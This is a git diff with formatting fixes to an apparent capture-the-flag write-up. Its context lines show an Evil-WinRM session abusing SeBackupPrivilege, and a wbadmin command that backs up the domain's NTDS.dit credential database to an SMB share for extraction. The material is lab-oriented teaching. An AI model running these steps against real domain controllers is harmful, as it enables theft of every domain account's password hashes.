@@ -6,7 +6,7 @@ Looking at the privileges of our user we find **SeBackupPrivilege** & **SeRestor
 > This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.
 
 ```console
-#*Evil-WinRM* PS C:\Users\svc_backup> whoami /priv 
+*Evil-WinRM* PS C:\Users\svc_backup> whoami /priv 
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -64,8 +64,8 @@ We could also achieve this by hosting our own SMB share from our machine but I p
 *Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.10.192\C$\Windows\Temp> mkdir CFX
 *Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.10.192\C$\Windows\Temp\CFX> wbadmin start backup -backuptarget:\\10.10.10.192\C$\Windows\Temp\CFX\ -include:c:\Windows\ntds\ntds
 .dit -quiet
-````
-Now that we have obtained **WindowsImageBackup** of **NTDS.dit** file inside the SMB share, we’ll recovery the file inside our directory **C:\Users\svc_backup\Documents\**
+```
+Now that we have obtained **WindowsImageBackup** of **NTDS.dit** file inside the SMB share, we’ll recovery the file inside our directory **C:\Users\svc_backup\Documents**
 
 For recovering the backup we need the backup version:
 ```console
